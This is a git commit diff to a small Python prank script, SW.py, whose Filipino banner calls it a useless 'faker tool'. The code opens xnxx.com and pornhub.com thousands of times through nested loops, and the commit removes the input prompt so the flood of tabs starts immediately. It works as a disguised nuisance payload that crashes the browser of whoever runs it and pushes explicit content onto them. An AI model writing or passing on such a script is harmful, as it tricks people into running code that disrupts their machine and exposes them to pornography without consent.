3e2eb0ac1ceae2f2a98b3169354ec74409069e70
Ph-Thund3r <70021444+Ph-Thund3r@users.noreply.github.com>
2020-08-22 00:41:42 +0800

    Update SW.py

--- SW.py
+++ SW.py
@@ -4,14 +4,10 @@ print("""
 [°]WELCOME TO MADA FAKER TOOL NA WALANG SILBI  [°]
 []=====================≠======================[]
 
-(+) Ps: MAGANDA TOH GAMITIN PAG GABI HAHA TRUST ME (+)
-""")
+(+) Ps: MAGANDA TOH GAMITIN PAG GABI HAHA (+)""")
 print (" ")
 print ( " " )
-input("""Input ka dito kahit ano tas go kana
->>
-""")
 for i in range(1,70):
    webbrowser.open("https://xnxx.com")
-   for i in range(1,70):
+   for x in range(1,70):
       webbrowser.open("https://pornhub.com")
